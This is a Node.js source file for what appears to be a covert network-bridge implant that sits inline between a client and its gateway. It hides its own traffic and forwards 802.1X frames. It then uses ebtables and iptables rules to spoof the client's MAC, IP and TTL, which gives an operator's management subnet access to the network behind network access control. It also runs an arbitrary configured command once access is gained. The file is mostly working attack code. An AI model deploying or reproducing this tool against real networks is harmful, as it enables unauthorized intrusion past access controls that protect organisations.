const EventEmitter = require('events')
const fs = require('fs')

var full_log = fs.createWriteStream(__dirname + '/logs/history.log', {flags : 'a'})
var current_log = fs.createWriteStream(__dirname + '/logs/current.log', {flags : 'w'})

//custom class to track network information based on sniffed packets
const NetInfo = require('./net_info.js')

const { execSync } = require("child_process")

//os cmd helper function
function os_cmd(comment, cmd){
  console.log(`INFO: ${comment}`)
  console.log(`COMMAND: ${cmd}`)
  full_log.write(`INFO: ${comment}\n`)
  full_log.write(`COMMAND: ${cmd}\n`)
  current_log.write(`INFO: ${comment}\n`)
  current_log.write(`COMMAND: ${cmd}\n`)
  let output = execSync(cmd, {"timeout": 10000}).toString()
  if(output.length > 0){
     console.log(`OUTPUT: ${output}`)
     full_log.write(`OUTPUT: ${output}\n`)
     current_log.write(`OUTPUT: ${output}\n`)
  }
  return output
}

//custom class to manage the bridge interface, set iptables/ebtables/arptables rules, and update system network info 
class BridgeController extends EventEmitter {
  constructor(config) {
    super()
    this.bridge_name = "mibr"
    this.bridge_subnet = '169.254.0.0/16'
    this.bridge_ip = '169.254.66.77'
    this.bridge_mac = '00:01:01:01:01:01'
    this.ephemeral_ports = '61000-62000'
    this.virtual_gateway_ip = '169.254.66.55'
    this.mgmt_subnet = config.management_subnet
    this.nic1 = config.network_interface1
    this.nic2 = config.network_interface2
    this.replace_default_route = config.replace_default_route
    this.run_command_on_success = config.run_command_on_success
    this.autorun_command = config.autorun_command
    this.gateway_side_interface = ''
    this.client_side_interface = ''
  }

  start_bridge(){
    os_cmd('Add arptable filter', `modprobe arptable_filter`)
    //os_cmd('Add bridge filter', `modprobe br_netfilter`)
    //os_cmd('Enforce arptables on the bridge', `sysctl -w net.bridge.bridge-nf-call-arptables=1`)
    //os_cmd('Enforce ip6 tables on the bridge', `sysctl -w net.bridge.bridge-nf-call-ip6tables=1`)
    //os_cmd('Enforce iptables on the bridge', `sysctl -w net.bridge.bridge-nf-call-iptables=1`)
    os_cmd('Drop broadcast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d ff:ff:ff:ff:ff:ff -j DROP`)
    os_cmd('Drop multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 01:00:5e:00:00:01 -j DROP`)
    os_cmd('Drop ipv6 multicast traffic from our device', `ebtables -t filter -A OUTPUT -s ${this.bridge_mac} -d 33:33:00:00:00:01 -j DROP`)
    os_cmd('Stop netmanager from trying to manage nic1', `nmcli d set ${this.nic1} managed no`)
    os_cmd('Stop netmanager from trying to manage nic2', `nmcli d set ${this.nic2} managed no`)
    os_cmd('Allow arp filters on bridge', `modprobe arptable_filter`)
    os_cmd('Allow net filters on bridge', `modprobe br_netfilter`)
    os_cmd('Create bridge interface', `brctl addbr ${this.bridge_name}`)
    os_cmd('Disable ipv6 auto configuration on bridge', `sysctl -w net.ipv6.conf.${this.bridge_name}.autoconf=0`)
    os_cmd('Ignore ipv6 router advertisements on bridge', `sysctl -w net.ipv6.conf.${this.bridge_name}.accept_ra=0`)
    os_cmd('Disable ipv6 auto configuration on nic1', `sysctl -w net.ipv6.conf.${this.nic1}.autoconf=0`)
    os_cmd('Ignore ipv6 router advertisements on nic1', `sysctl -w net.ipv6.conf.${this.nic1}.accept_ra=0`)
    os_cmd('Disable ipv6 auto configuration on nic2', `sysctl -w net.ipv6.conf.${this.nic2}.autoconf=0`)
    os_cmd('Ignore ipv6 router advertisements on nic2', `sysctl -w net.ipv6.conf.${this.nic2}.accept_ra=0`)
    os_cmd('Set promic mode on bridge', `ip link set dev ${this.bridge_name} promisc on`)
    os_cmd('Set promic mode on nic1', `ip link set dev ${this.nic1} promisc on`)
    os_cmd('Set promic mode on nic2', `ip link set dev ${this.nic2} promisc on`)
    os_cmd('Add nic1 to bridge', `brctl addif ${this.bridge_name} ${this.nic1}`)
    os_cmd('Add nic2 to bridge', `brctl addif ${this.bridge_name} ${this.nic2}`)
    os_cmd('Give the bridge an IP in the APIPA range', `ip addr add ${this.bridge_ip}/16 dev ${this.bridge_name}`)
    os_cmd('Set the bridge MAC to a known value', `ip link set dev ${this.bridge_name} address ${this.bridge_mac} arp off`)
    os_cmd('Drop all outbound ARP from our device', `arptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
    os_cmd('Drop all outbound TCP/UDP from our device for now', `iptables -A OUTPUT -o ${this.bridge_name} -j DROP`)
    os_cmd('Drop all outbound ethernet multicast from our device for now', `ebtables -A OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
    os_cmd('Turn on the bridge interface', `ip link set dev ${this.bridge_name} up`)
    os_cmd('Ensure nic1 is up', `ip link set dev ${this.nic1} up`)
    os_cmd('Ensure nic2 is up', `ip link set dev ${this.nic2} up`)
    if(this.replace_default_route){
      let dr = os_cmd('Get default route in case we need to delete it', `ip route |grep default |head`)
      if(dr.length > 0){
        try{
          os_cmd('Delete default route', `ip route delete ${dr} >/dev/null 2>&1`)
        }catch(err){
          console.log(err)
        }
      }
    }
    os_cmd('Allow EPOL 802.1x packets to traverse our bridge',`echo 8 > /sys/class/net/mibr/bridge/group_fwd_mask`)
    var bridge_controller = this
    this.net_info = new NetInfo(this.bridge_name)
    this.net_info.on('new_arp', function(arp_info){
      bridge_controller.emit('bridge_update', {type: 'new_arp', data: arp_info})
      bridge_controller.new_arp(arp_info)
    })
    this.net_info.on('dns_update', function(dns_servers){
      bridge_controller.emit('bridge_update', {type: 'dns_update', data: dns_servers})
      bridge_controller.update_dns(dns_servers)
    })
    this.net_info.once('client_ip_mac_and_gateway_mac', function(info){
      bridge_controller.emit('bridge_update', {type: 'cimagm', data: info})
      bridge_controller.spoof_client_to_gateway(info)
    })
    this.net_info.once('gateway_ip_mac_and_client_mac', function(info){
      bridge_controller.emit('bridge_update', {type: 'gimacm', data: info})
      bridge_controller.spoof_gateway_to_client(info)
    })
    this.net_info.once('client_ttl', function(info){
      bridge_controller.emit('bridge_update', {type: 'client_ttl', data: info})
      bridge_controller.modify_ttl(info)
    })
    this.emit('bridge_up', this.bridge_name)
  }

  allow_internet_traffic(){
    try{
      os_cmd('Clear any existing default route',`ip route del default`)
    }catch(err){
      console.log(err)
    }
    os_cmd('Add bridge as a default route to allow Internet access',`ip route add default via ${this.virtual_gateway_ip} dev ${this.bridge_name}`)
  }

  flush_tables(shutdown){
    os_cmd('Clear ebtables rules',`ebtables -t filter -F`)
    os_cmd('Clear ebtables NAT rules',`ebtables -t nat -F`)
    os_cmd('Clear iptables filters',`iptables -t filter -F`)
    os_cmd('Clear iptables NAT rules',`iptables -t nat -F`)
    os_cmd('Clear iptables mangle rules',`iptables -t mangle -F`)
    os_cmd('Clear iptables rules',`iptables -t raw -F`)
    this.stop_bridge(shutdown)
  }
  
  stop_bridge(shutdown){
    if(shutdown){
      os_cmd('Remove nic1 from bridge', `brctl delif ${this.bridge_name} ${this.nic1}`)
      os_cmd('Remove nic2 from bridge', `brctl delif ${this.bridge_name} ${this.nic2}`)
      os_cmd('Shut down bridge interface', `ip link set dev ${this.bridge_name} down`)
      os_cmd('Remove bridge interface', `brctl delbr ${this.bridge_name}`)
      os_cmd('Allow netmanager to manage nic1', `nmcli d set ${this.nic1} managed yes`)
      os_cmd('Allow netmanager to manage nic2', `nmcli d set ${this.nic2} managed yes`)
      process.exit()
    }
  }

  modify_ttl(info){
    os_cmd('Spoof client TTL',`iptables -t mangle -A POSTROUTING -o ${this.bridge_name} -j TTL --ttl-set ${info.client_ttl}`)
  }

  spoof_client_to_gateway(info){
    os_cmd('Tag all traffic from the bridge not destined for the client with the client\'s mac',
      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} ! -d ${info.client_mac} -j snat --snat-arp --to-source ${info.client_mac}`)
    os_cmd('Tag all tcp traffic from the bridge not destined for the client with the client\'s ip',
      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag udp tcp traffic from the bridge not destined for the client with the client\'s ip',
      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag icmp tcp traffic from the bridge not destined for the client with the client\'s ip',
      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
    os_cmd('Drop all inbound DHCP requests from our management subnet', `iptables -t filter -I FORWARD -p udp -s ${this.mgmt_subnet} --dport 67 -j DROP`)
    //we don't need to know the gateway's real IP to use it ;)
    os_cmd('Create a fake arp neighbor with an IP on our bridge that maps to the same mac as the real gateway',
      `ip neigh add ${this.virtual_gateway_ip} lladdr ${info.gateway_mac} dev ${this.bridge_name}`)
    if(this.replace_default_route){
      os_cmd('Add our virtual gateway as our default gateway',`ip route add default via ${this.virtual_gateway_ip} dev ${this.bridge_name}`)
    }else{
      let private_ranges = [
        '10.0.0.0/8',
        '192.168.0.0/16',
        '172.16.0.0/13',
        '172.24.0.0/14',
        '172.28.0.0/15',
        '172.30.0.0/16',
        '172.31.0.0/17',
        '172.31.128.0/18',
        '172.31.192.0/19',
        '172.31.224.0/20',
        '172.31.240.0/21',
        '172.31.248.0/22',
        '172.31.252.0/23',
        '172.31.254.0/24'
      ]
      let virt_gw_ip = this.virtual_gateway_ip
      let bridge_name = this.bridge_name
      private_ranges.forEach(function(range){
        os_cmd(`Add route to the private range ${range}`,`ip route add ${range} via ${virt_gw_ip} dev ${bridge_name}`)
      })
    }
    os_cmd('Allow ip forwarding so we can route from our management interface to the bridge',
      `echo 1 > /proc/sys/net/ipv4/ip_forward`)
    os_cmd('Add management range to spoof rules for tcp',
      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Add management range to spoof rules for udp',
      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}:${this.ephemeral_ports}`)
    os_cmd('Add management range to spoof rules for icmp',
      `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} ! -d ${info.client_ip} -j SNAT --to ${info.client_ip}`)
    os_cmd('Allow outbound ARP from our device', `arptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
    os_cmd('Allow outbound TCP/UDP from our device for now', `iptables -D OUTPUT -o ${this.bridge_name} -j DROP`)
    os_cmd('Allow outbound ethernet multicast from our device for now', `ebtables -D OUTPUT -o ${this.bridge_name} -d Multicast -j DROP`)
    //run a single command once we have network access
    if(this.run_command_on_success){
      os_cmd('Autorun command configured. Running:', this.autorun_command)
    }
  }

  spoof_gateway_to_client(info){
    os_cmd('Tag all traffic from the bridge to the client with the gateway\'s mac',
      `ebtables -t nat -A POSTROUTING -s ${this.bridge_mac} -d ${info.client_mac} -j snat --to-source ${info.gateway_mac}`)
    os_cmd('Tag all tcp traffic from the bridge to the client with the gateway\'s ip',
      `iptables -t nat -A POSTROUTING -p tcp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all udp traffic from the bridge to the client with the gateway\'s ip',
      `iptables -t nat -A POSTROUTING -p udp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Tag all icmp traffic from the bridge to the client with the gateway\'s ip',
      `iptables -t nat -A POSTROUTING -p icmp -s ${this.bridge_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
    os_cmd('Add management range to spoof rules for client connections over tcp',
      `iptables -t nat -A POSTROUTING -p tcp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Add management range to spoof rules for client connections over udp',
      `iptables -t nat -A POSTROUTING -p udp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}:${this.ephemeral_ports}`)
    os_cmd('Add management range to spoof rules for client connections over icmp',
       `iptables -t nat -A POSTROUTING -p icmp -s ${this.mgmt_subnet} -d ${info.client_ip} -j SNAT --to ${info.gateway_ip}`)
  }
  
  update_dns(dns_servers){
    console.log(dns_servers)
    os_cmd('Clear dns settings', `> /etc/resolv.conf`)
    dns_servers.forEach(function(server){
      os_cmd('Add DNS Server', `echo nameserver ${server}>> /etc/resolv.conf`)
    })
  }

  new_arp(arp_info){
    console.log(arp_info)
    os_cmd('Update arp entries for new neighbor',`ip neigh add ${arp_info.ip} lladdr ${arp_info.mac} dev ${this.bridge_name}`)
    os_cmd('Update routes for new neighbor',`ip route add ${arp_info.ip}/32 dev ${this.bridge_name}`)
  }
}

module.exports = BridgeController
